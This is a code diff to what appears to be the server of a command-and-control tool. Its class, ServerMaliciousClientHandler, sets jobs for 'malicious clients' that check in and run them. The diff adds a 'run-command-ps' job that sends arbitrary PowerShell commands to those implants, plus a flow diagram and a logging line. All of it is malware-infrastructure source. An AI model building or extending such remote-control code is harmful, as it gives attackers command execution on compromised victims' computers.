@@ -569,6 +569,10 @@ class ServerMaliciousClientHandler:
 
         This function is used for taking the friendly client input (input comes from 
         theServerSockHandler filter), and setting jobs for malicious clients. 
+
+        diagram:
+        GUI -> This function, sets self.current_job. 
+        Then, client checks in, reads self.current_job, and runs it through its filters
         """
         user_input = user_input_raw.lower()
 
@@ -596,6 +600,10 @@ class ServerMaliciousClientHandler:
             #print(self.current_job.strip("\\|/"))
             self.send_msg(self.current_job.strip("\\|/"))
 
+        elif user_input == "run-command-ps":
+            ps_command = command_value
+            self.current_job = f"run-command-ps\\|/{ps_command}"
+
         elif user_input == "":
             pass
             #send bacck instead of print
@@ -603,7 +611,7 @@ class ServerMaliciousClientHandler:
             self.send_msg("No input provided")
 
         else:
-
+            logging.debug(f"[Server (Gui -> server, setting job)] error with job setting")
             #send back as well
             #print("Job does not exist - type 'jobs' for jobs")
             self.current_job == "none"
